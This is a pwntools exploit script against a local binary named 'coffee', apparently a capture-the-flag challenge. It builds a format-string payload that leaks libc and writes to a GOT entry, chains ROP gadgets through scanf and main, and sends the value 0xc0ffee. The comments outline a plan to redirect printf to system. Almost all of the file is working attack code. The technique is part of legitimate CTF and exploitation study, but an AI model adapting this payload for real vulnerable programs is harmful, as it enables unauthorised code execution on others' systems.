from pwn import *
#context.terminal = ['tmux', 'new-window']

binary = './coffee'

p = process(binary)
p = gdb.debug(binary, gdbscript="""
        b * main+52
        b * main+85
        b * main+107
        c
        """)

fini = 0x00002000
pop_rdi_ret = 0x0000000000401293
pop_rsi_r15_ret = 0x0000000000401291
five_pop = 0x40128b
puts_plt = 0x00404018
rodata_string = 0x402004
x = 0x404048
scanf_plt = 0x4010a4
main = 0x401196
ret = 0x000000000040101a
# leak libc, stack
# overwrite fini - jmp to main
# stack_check_got - jmp to main
# x = 0xc0ffee

# overwrite printf_got - system
# overwrite canary - trigger stk_chk_fail()
# overwr
#payload = b'%10000x%9$n+8;%29$p;%9$p;'

#         b'%64x%_$h hn%4683x AAA%_$hn _________ _______
payload = b'%29$p%4734x%8$hn'
payload += p64(puts_plt)
payload += p64(pop_rsi_r15_ret)
payload += p64(x)
payload += p64(0)
#payload += p64(pop_rdi_ret)
#payload += p64(0x402004) # scanf zajebe
payload += p64(scanf_plt)
payload += p64(ret)
payload += p64(main)


# libc - %29$p
# input - %6$p


p.sendline(payload)

p.sendline(p64(0xc0ffee))
p.interactive()
p.close()
